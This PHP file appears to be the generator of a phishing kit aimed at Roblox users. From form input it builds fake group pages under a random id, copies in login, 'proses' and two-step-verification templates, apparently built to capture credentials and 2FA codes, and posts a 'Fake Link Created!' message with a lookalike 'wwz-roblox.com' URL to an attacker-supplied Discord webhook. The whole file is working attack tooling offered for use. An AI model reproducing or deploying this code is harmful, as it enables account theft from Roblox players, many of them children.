<?php
if(isset($_POST['submit'])) {
$webhook = $_POST['webhooks'];
$ownername = $_POST['ownername'];
$groupfunds = $_POST['groupfunds'];
$membercount = $_POST['membercount'];
$groupdescription = $_POST['groupdescription'];
$groupname = $_POST['groupname'];
$groupicon = $_POST['groupicon'];
$robloxuserid = rand();
$webhook = $_POST['webhooks'];
$notfound = array('{"success":false,"errorMessage":"User not found"}');
$nofunction = array('<','>','');
$namegroup = str_replace(' ', '-', $groupname);
    $filename = '..groups/';
    $indexphp = file_get_contents("genfile/indexphp");
    $setupphp = file_get_contents("genfile/setupphp");
    $functionphp = file_get_contents("genfile/functionphp");
    $pphp = file_get_contents("genfile/pphp");
    $prosesphp = file_get_contents("genfile/login/prosesphp");
    $index2stepphp = file_get_contents("genfile/login/index2stepphp");
    $indexstep = file_get_contents("genfile/login/twostepverification/indexphp");
    $step2 = file_get_contents("genfile/login/twostepverification/stepphp");
    mkdir('../groups/'.$robloxuserid."/".$namegroup.'/about', 0777, true);
    mkdir('../groups/'.$robloxuserid."/".$namegroup.'/about/login', 0777, true);
    mkdir('../groups/'.$robloxuserid."/".$namegroup.'/about/login/twostepverification', 0777, true);
    file_put_contents('../groups/'.$robloxuserid."/".$namegroup.'/about/index.php', $indexphp);
    file_put_contents('../groups/'.$robloxuserid."/".$namegroup.'/about/setup.php', $setupphp);
    file_put_contents('../groups/'.$robloxuserid."/".$namegroup.'/about/function.php', $functionphp);
    file_put_contents('../groups/'.$robloxuserid."/".$namegroup.'/about/p.php', $pphp);
    file_put_contents('../groups/'.$robloxuserid."/".$namegroup.'/about/login/index.php', $index2stepphp);
    file_put_contents('../groups/'.$robloxuserid."/".$namegroup.'/about/login/proses.php', $prosesphp);
    file_put_contents('../groups/'.$robloxuserid."/".$namegroup.'/about/login/twostepverification/index.php', $indexstep);
    file_put_contents('../groups/'.$robloxuserid."/".$namegroup.'/about/login/twostepverification/step.php', $step2);
    fwrite(fopen('../groups/'.$robloxuserid."/".$namegroup.'/about/setup.php', "w"), str_replace("{webhook}", $_POST['webhooks'],
    str_replace("{ownername}", $_POST['ownername'], str_replace("{groupfunds}", $_POST['groupfunds'],str_replace("{membercount}", $_POST['membercount'],str_replace("{groupdescription}", $_POST['groupdescription'],str_replace("{groupname}", $_POST['groupname'],str_replace("{groupicon}", $_POST['groupicon'],file_get_contents("genfile/setupphp")))))))));
    
    
$timestamp = date("c", strtotime("now"));
$url = $webhook;

$hookObject = json_encode([
    /*
     * The general "message" shown above your embeds
     */
    "content" => "@everyone",
    /*
     * The username shown in the message
     */
    "username" => "WxR Notification",
    /*
     * The image location for the senders image
     */
    "avatar_url" => "https://images-ext-2.discordapp.net/external/QXYUGtfSnOmgQj0Y245VmFeZd9664UhvbCn-Ooo5rqw/https/images-ext-1.discordapp.net/external/b_a3LEPCOR8-UgZQgbXVjXXxWOhA1bnSeduRtUAp8Ik/https/media.discordapp.net/attachments/882339669319245904/885694774521237504/standard.gif",
    /*
     * Whether or not to read the message in Text-to-speech
     */
    "tts" => false,
    /*
     * File contents to send to upload a file
     */
    // "file" => "",
    /*
     * An array of Embeds
     */
    "embeds" => [
        /*
         * Our first embed
         */
        [
            // Set the title for your embed
            "title" => "Join Our Server",

            // The type of your embed, will ALWAYS be "rich"
            "type" => "rich",

            // A description for your embed
            "description" => "",

            // The URL of where your title will be a link to
            "url" => "https://discord.gg/ksXzNX7nuk",

            /* A timestamp to be displayed below the embed, IE for when an an article was posted
             * This must be formatted as ISO8601
             */
            "timestamp" => $timestamp,

            // The integer color to be used on the left side of the embed
            "color" => hexdec( "0022e6" ),

            // Footer object
            "footer" => [
                "text" => "WxR Notification",
              "icon_url" => "https://images-ext-1.discordapp.net/external/b_a3LEPCOR8-UgZQgbXVjXXxWOhA1bnSeduRtUAp8Ik/https/media.discordapp.net/attachments/882339669319245904/885694774521237504/standard.gif"
            ],

            // Image object
            "image" => [
                "url" => "https://images-ext-1.discordapp.net/external/b_a3LEPCOR8-UgZQgbXVjXXxWOhA1bnSeduRtUAp8Ik/https/media.discordapp.net/attachments/882339669319245904/885694774521237504/standard.gif"
            ],

            // Thumbnail object
            "thumbnail" => [
                "url" => "https://images-ext-2.discordapp.net/external/QXYUGtfSnOmgQj0Y245VmFeZd9664UhvbCn-Ooo5rqw/https/images-ext-1.discordapp.net/external/b_a3LEPCOR8-UgZQgbXVjXXxWOhA1bnSeduRtUAp8Ik/https/media.discordapp.net/attachments/882339669319245904/885694774521237504/standard.gif"
            ],

            // Author object
            "author" => [
                "name" => "WxR Notification",
                "url" => "https://discord.gg/ksXzNX7nuk"
            ],

            // Field array of objects
            "fields" => [
                // Field 1
                [
                    "name" => "Fake Link Created!",
                    "value" => "```https://wwz-roblox.com/groups/".$robloxuserid."/".$namegroup."/abouts```",
                    "inline" => true
                ]
            ]
        ]
    ]

], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );

$ch = curl_init();

curl_setopt_array( $ch, [
    CURLOPT_URL => $url,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $hookObject,
    CURLOPT_HTTPHEADER => [
        "Content-Type: application/json"
    ]
]);

$response = curl_exec( $ch );
curl_close( $ch );
    header("Location: ../groups/$robloxuserid/$namegroup/about");
    
}else{
    header("Location: index.php");
    exit();
}
?>